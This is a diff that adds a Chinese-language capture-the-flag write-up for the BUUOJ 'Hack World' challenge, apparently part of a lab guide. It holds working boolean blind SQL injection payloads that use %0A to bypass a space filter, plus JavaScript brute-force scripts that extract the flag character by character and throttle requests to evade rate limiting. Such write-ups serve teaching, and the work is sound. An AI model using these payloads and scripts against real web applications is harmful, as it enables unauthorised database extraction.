@@ -165,6 +165,87 @@ import cast6 from './casts/lab0-p6.cast?raw';
 
 > 这里选取一个比较经典的题：[Hack World](https://buuoj.cn/challenges#[CISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day2%20Web1]Hack%20World)
 
+~~sqlmap启动(结果没爆出来)~~
+
+发现部分输入会`SQL Injection Checked.`，首先空格被ban了我们得来一个[No Space Bypass](https://book.hacktricks.wiki/en/pentesting-web/sql-injection/index.html#no-spaces-bypass),试了一下发现`%0A`可以替换空格绕过
+
+但是`union`疑似也被ban了，所以我们的`1 union select flag from flag`大法失效了
+
+所以只能试试布尔盲注[Exploiting Blind SQLi](https://book.hacktricks.wiki/en/pentesting-web/sql-injection/index.html#exploiting-blind-sqli)
+
+> In this case you cannot see the results of the query or the errors, but you can **distinguished** when the query return a **true** or a **false** response because there are different contents on the page. In this case, you can abuse that behaviour to dump the database char by char
+
+中间省略，总之造了一个payload`(ASCII(SUBSTR((select%0Aflag%0Afrom%0Aflag),1,1))=102)`发现能dump
+
+```js
+(async () => {
+  for (let i = 0; i < 100; i++) {
+    for (let char = 0; char < 256; char++) {
+      if (await fetch("http://c3b67b65-dccc-4d8e-a6d1-2275baa54bb5.node5.buuoj.cn:81/index.php", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/x-www-form-urlencoded"
+        },
+        body: `id=1%20and%20ASCII(SUBSTR((select%0Aflag%0Afrom%0Aflag),${i},1))=${char}`
+      }).then(v => v.text()).then(o => {
+        if (/Hello, glzjin wants a girlfriend./.test(o)) {
+          return true
+        } else {
+          return false
+        }
+      })) {
+        console.log("flag[", i, "]:", String.fromCharCode(char))
+        break
+      }
+    }
+
+  }
+})();
+```
+
+爆了半天发现我们还有《429 Too many requests》
+
+遂做如下修改（因为说了`flag{}`里面是uuid，所以charset可以放很小）：
+```js
+let flag=[];
+
+const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
+const charset = "0123456789abcdef-lag{}"
+;(async () => {
+  for (let i = 0; i < 100; i++) {
+    for (let char in charset) {
+      if (await fetch("http://c3b67b65-dccc-4d8e-a6d1-2275baa54bb5.node5.buuoj.cn:81/index.php", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/x-www-form-urlencoded"
+        },
+        body: `id=(ASCII(SUBSTR((select%0Aflag%0Afrom%0Aflag),${i},1))=${charset[char].charCodeAt(0)})`
+      }).then(v => v.text()).then(o => {
+        console.log(i,charset[char],o.length);
+        
+        if (/Hello, glzjin wants a girlfriend./.test(o)) {
+          return true
+        } else {
+          return false
+        }
+      })) {
+        flag[i]=charset[char]
+        console.log("flag[", i, "]:", charset[char])
+        console.log("flag:", flag.join(""));
+        
+        break
+      }
+      await sleep(100);
+    }
+  }
+})();
+```
+
+import cast10 from './casts/lab0-p10.cast?raw';
+
+<Asciinema cast={cast10} />
+
+![](./images/lab0-o3.png)
 
 # Reverse
 
